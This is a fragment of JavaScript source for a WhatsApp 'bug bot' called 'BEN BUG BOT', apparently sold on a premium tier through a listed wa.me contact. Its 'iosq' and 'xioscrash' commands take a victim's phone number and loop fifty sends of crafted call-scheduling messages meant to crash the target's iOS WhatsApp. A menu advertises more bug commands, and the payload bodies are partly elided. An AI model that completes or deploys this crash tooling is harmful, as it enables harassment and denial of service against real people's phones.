...
`.trim()
            ...
            case 'buyprem':
            case 'premium': {
                let teks = `Hi ${pushname}👋\nWant to Buy Premium? Just chat with the 𝐵𝛯𝛮 𝐵𝑈𝐺 𝐵𝛩𝑇 wa.me/254719485000😉`
                await XeonBotInc.sendMessage(m.chat, {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
...
case 'iosq':{
if (!isPremium) return replygcxeon(mess.prem)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 254xxxxxxx`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
...
case 'xioscrash':
if (!isPremium) return replygcxeon(mess.prem)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 254xxxxxxxx`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
...
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Africa/Kenya").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
...
break
            ...
            case 'help':
            case 'alive':
                let xeonmenuoh = `╭══ *❍ 𝐵𝛯𝛮 𝐵𝑈𝐺 𝐵𝛩𝑇 ❍*
┃❁ *ᴏᴡɴᴇʀ:* 𝐵𝛯𝛮 𝐵𝑈𝐺 𝐵𝛩𝑇
┃❁ *ᴜᴘᴛɪᴍᴇ:* ${runtime(process.uptime())}
┃❁ *User:* ${pushname}
╰┈➤ ${xeonytimewisher} 😄  My viewer
⚠️⚠️ ~Don't forget to subscribe~ 
*Tech god* ~Youtube Channel~ ⚠️⚠️
_Any help: yt link http://www.youtube.com/@drben001_
╰═════════════════⊷
╭═══❂ 𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 ❂
┃ ❏ *xʀᴇᴀᴄᴛ <ʀᴇᴘʟʏ ᴄʜᴀᴛ>*
┃ ❏ *x <ɴᴜᴍʙᴇʀ|ᴀᴍᴏᴜɴᴛ>*
